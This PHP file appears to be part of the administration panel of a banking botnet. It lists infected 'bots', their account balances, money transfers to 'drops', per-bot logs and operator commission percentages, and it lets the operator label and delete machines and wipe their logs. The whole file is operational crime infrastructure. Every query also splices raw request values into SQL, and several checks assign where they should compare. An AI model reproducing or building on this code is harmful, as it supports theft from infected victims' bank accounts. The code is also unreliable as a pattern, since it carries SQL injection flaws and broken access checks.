<?php
//error_reporting(-1);
switch($Cur['x']){
    case 'delete':
        if(!empty($Cur['str']) && !empty($Cur['z'])){
            $matches = explode('0', $Cur['str'], 2);
            if(!empty($matches[0]) && !empty($matches[1])){
                    $prefix = $matches[0];
                    $uid = '0' . $matches[1];
            }
            
            if(!empty($prefix) && !empty($uid)){
                if($_SESSION['user']->config['infoacc'] == '1'){
                    if($_SESSION['user']->config['systems'][$Cur['z']] == true){
                        $mysqli->query("delete from bf_bots WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."') LIMIT 1");
                        //$mysqli->query("delete from bf_comments WHERE (prefix='".$prefix."') AND (uid='".$uid."')");
                        $mysqli->query("delete from bf_balance WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_hidden WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_logs WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_logs_passiv WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_log_info WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_logs_history WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_logs_tech WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                        $mysqli->query("delete from bf_transfers WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    }
                }else{
                    //echo "delete from bf_bots WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."') LIMIT 1";
                    $mysqli->query("delete from bf_bots WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."') LIMIT 1");
                    //$mysqli->query("delete from bf_comments WHERE (prefix='".$prefix."') AND (uid='".$uid."')");
                    $mysqli->query("delete from bf_balance WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_hidden WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_logs WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_logs_passiv WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_log_info WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_logs_history WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_logs_tech WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                    $mysqli->query("delete from bf_transfers WHERE (prefix='".$prefix."') AND (uid='".$uid."') AND (system='".$Cur['z']."')");
                }
            }
            
            header('Location: /bots/system-'.$Cur['z'].'.html?ajax=1&page=' . $Cur['page']);
            exit;
        }
    break;

    case 'label':
        if(!empty($Cur['y'])){
            $bot = $mysqli->query('SELECT id, label FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                if($bot->label == $Cur['y']){
                    $Cur['y'] = '';
                    $mysqli->query('update bf_bots set label = \'\' WHERE (id = \''.$bot->id.'\')');
                }else{
                    $mysqli->query('update bf_bots set label = \''.$Cur['y'].'\' WHERE (id = \''.$bot->id.'\')');
                }
                
                
                $txt = '<div class="labels l1" onclick="bls(\''.$bot->id.'\', \'l1\', \''.$Cur['z'].'\');">'. ($Cur['y'] == 'l1' ? ' OK! ' : '&nbsp;').'</div>';
                $txt .= '<div class="labels l2" onclick="bls(\''.$bot->id.'\', \'l2\', \''.$Cur['z'].'\');">'. ($Cur['y'] == 'l2' ? ' OK! ' : '&nbsp;').'</div>';
                $txt .= '<div class="labels l3" onclick="bls(\''.$bot->id.'\', \'l3\', \''.$Cur['z'].'\');">'. ($Cur['y'] == 'l3' ? ' OK! ' : '&nbsp;').'</div>';
                
                print($txt);
            }
        }else{
            echo 'error!';
        }
        
        exit;
    break;

    case 'logs':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                get_function('html_pages');
                
                $bot->logs = $mysqli->query('SELECT * FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
                $bot->logs_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
                
                $smarty->assign('logs_pages', html_pages('/bots/?', $bot->logs_count, 10, 1, 'gld', 'this'));
                $smarty->assign('bot', $bot);
                $smarty->assign('rand_name', $Cur['z']);
                
                $smarty->display('modules/bots/logs.tpl');
            }
        }
        
        exit;
    break;

    case 'save_note':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system, info FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                $bot->info = json_decode(base64_decode($bot->info), true);
                
                $bot->info['note'] = $_POST['text'];
                
                $mysqli->query('update bf_bots set info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\')');
                if(empty($bot->info['note'])){
                    echo ' ';
                }else{
                    echo $bot->info['note'];
                }
                
            }else{
                echo ' ';
            }
        }

        exit;
    break;

    case 'logs_tech':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                get_function('html_pages');
                
                $bot->logs_tech = $mysqli->query('SELECT * FROM bf_logs_tech WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
                $bot->logs_tech_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs_tech WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
                
                $smarty->assign('logs_tech_pages', html_pages('/bots/?', $bot->logs_tech_count, 10, 1, 'gldt', 'this'));
                $smarty->assign('bot', $bot);
                $smarty->assign('rand_name', $Cur['z']);
                
                $smarty->display('modules/bots/logs_tech.tpl');
            }
        }
        
        exit;
    break;

    case 'logs_history':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                get_function('html_pages');
                
                $bot->logs_history = $mysqli->query('SELECT * FROM bf_logs_history WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
                $bot->logs_history_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs_history WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');

                $smarty->assign('logs_history_pages', html_pages('/bots/?', $bot->logs_history_count, 10, 1, 'gldh', 'this'));
                $smarty->assign('bot', $bot);
                $smarty->assign('rand_name', $Cur['z']);
                
                $smarty->display('modules/bots/logs_history.tpl');
            }
        }
        
        exit;
    break;

    case 'tlogs_clear':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                $mysqli->query("delete from bf_logs_tech WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."') AND (system='".$bot->system."')");
            }
        }
        echo '<div align="center">OK!</div>';
        exit;
    break;

    case 'edit_percent':
        if(!empty($Cur['str'])){
            $matches = explode('0', $Cur['str'], 2);
            if(!empty($matches[0]) && !empty($matches[1])){
                    $prefix = $matches[0];
                    $uid = '0' . $matches[1];
            }
            
            if(!empty($prefix) && !empty($uid)){
                $bot = $mysqli->query('SELECT id, prefix, uid, system, info FROM bf_bots WHERE (id<>\'0\') AND (prefix=\''.$prefix.'\') AND (uid=\''.$uid.'\') LIMIT 1');
                
                if($bot->prefix == $prefix && $bot->uid == $uid){
                    $bot->info = @json_decode(@base64_decode($bot->info), true);
                    if(isset($_POST['system_percent'])){
                        $bot->info['system_percent'] = $_POST['system_percent'];
                        if(empty($bot->info['system_percent'])) unset($bot->info['system_percent']);
                        $mysqli->query('update bf_bots set info = \''.base64_encode(json_encode($bot->info)).'\' WHERE (id = \''.$bot->id.'\')');
                        if(empty($_POST['system_percent'])){
                            echo 'Стандарт';
                        }else{
                            echo 'Личный: '.$_POST['system_percent'].'%';
                        }
                    }else{
                        $Cur['z'] = str_replace('ep', '', $Cur['z']);
                        echo 'Личный: <input type="text" name="epi'.$Cur['z'].'" value="'.$bot->info['system_percent'].'" style="width: 40px;" maxlength="3" />';
                        echo ' <input type="button" value="Save" onclick="edit_percent_save(\''.$prefix.$uid.'\', \''.$Cur['z'].'\');" />';
                    }
                }
            }
        }
        exit;
    break;

    case 'hlogs_clear':
        if(!empty($Cur['id'])){            
            $bot = $mysqli->query('SELECT id, prefix, uid, system FROM bf_bots WHERE (id<>\'0\') AND (id=\''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1' && $_SESSION['user']->config['systems'][$bot->system] != true){
                unset($bot);
            }
            
            if($bot->id = $Cur['id']){
                $mysqli->query("delete from bf_logs_history WHERE (prefix='".$bot->prefix."') AND (uid='".$bot->uid."') AND (system='".$bot->system."')");
            }
        }
        echo '<div align="center">OK!</div>';
        exit;
    break;

    default:
        get_function('html_pages');
        
        function getdi(&$info){
            $info = json_decode(base64_decode($info));
            $info->drop->other = get_object_vars($info->drop->other);
        }
        
        function system_get($row){
            global $systems;
            $systems[$row->nid] = $row->name;
        }
        
        $true = false;
        
        if(!empty($Cur['id'])){
            $true = true;
            $bot = $mysqli->query('SELECT * FROM bf_bots WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
            
            if($_SESSION['user']->config['infoacc'] == '1'){
                if($bot->id != $Cur['id']){
                    $smarty->assign('nobot', true);
                }else{
                    if($_SESSION['user']->config['systems'][$bot->system] != true){
                        unset($bot);
                        $smarty->assign('nobot', true);
                    }

                    if(!empty($_SESSION['user']->config['userid'])){
                        if($_SESSION['user']->config['userid'] != $bot->userid){
                            unset($bot);
                            $smarty->assign('nobot', true);
                        }
                    }
                }
            }else{
                if($bot->id != $Cur['id']) $smarty->assign('nobot', true);
            }
        }elseif(!empty($Cur['str']) && !empty($Cur['z'])){
            $true = true;
            $matches = explode('0', $Cur['str'], 2);
            if(!empty($matches[0]) && !empty($matches[1])){
                $prefix = $matches[0];
                $uid = '0' . $matches[1];
            }
            
            if(!empty($prefix) && !empty($uid)){
                $bot = $mysqli->query('SELECT * FROM bf_bots WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (system = \''.strtolower($Cur['z']).'\') LIMIT 1');
                if($_SESSION['user']->config['infoacc'] == '1'){
                    if($bot->prefix != $prefix || $bot->uid != $uid){
                        $smarty->assign('nobot', true);
                    }else{
                        if($_SESSION['user']->config['systems'][$bot->system] == true){
                            unset($bot);
                            $smarty->assign('nobot', true);
                        }
                        
                        if(!empty($_SESSION['user']->config['userid'])){
                            if($_SESSION['user']->config['userid'] != $bot->userid){
                                unset($bot);
                                $smarty->assign('nobot', true);
                            }
                        }
                    }
                }else{
                    if($bot->prefix != $prefix || $bot->uid != $uid) $smarty->assign('nobot', true);
                }
            }else{
                $smarty->assign('nobot', true);
            }
        }

        if($true == true){
            if($smarty->tpl_vars['nobot']->value != true){
                $bot->info = json_decode(base64_decode($bot->info), true);
                $bot->systems = $mysqli->query('SELECT id, nid, name, percent FROM bf_systems WHERE (nid = \''.$bot->system.'\') LIMIT 1');
                $bot->balance = $mysqli->query('SELECT * FROM bf_balance WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by post_date DESC', null, null, false);
                $bot->drops_data = $mysqli->query('SELECT * FROM bf_transfers WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC', null, null, false);
                $bot->logs = $mysqli->query('SELECT * FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\') ORDER by id DESC LIMIT ' . (($Cur['page'] == 0) ? 10 : $Cur['page']*10 . ',' . 10), null, null, false);
                $bot->logs_count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_logs WHERE (prefix = \''.$bot->prefix.'\') AND (uid = \''.$bot->uid.'\') AND (system = \''.$bot->system.'\')');
                
                $smarty->assign('logs_pages', html_pages('/bots/?', $bot->logs_count, 10, 1, 'gld', 'this'));
                $smarty->assign('bot', $bot);
            }elseif(!empty($uid)){
                if($_SESSION['user']->config['infoacc'] == '1'){
                    foreach($_SESSION['user']->config['systems'] as $key => $item){
                        $sql .= ' OR (system = \''.$key.'\')';
                    }
                    $sql = preg_replace('~^ OR ~', '', $sql);
                    
                    if(!empty($sql)) $bot_uid = $mysqli->query('SELECT * FROM bf_bots WHERE ('.$sql.') AND (uid = \''.$uid.'\') LIMIT 1');
                }else{
                    $bot_uid = $mysqli->query('SELECT * FROM bf_bots WHERE (uid = \''.$uid.'\') LIMIT 1');
                }
                
                if($bot_uid->uid == $uid) $smarty->assign('bot_uid', $bot_uid);
            }
        }
    break;
}

?>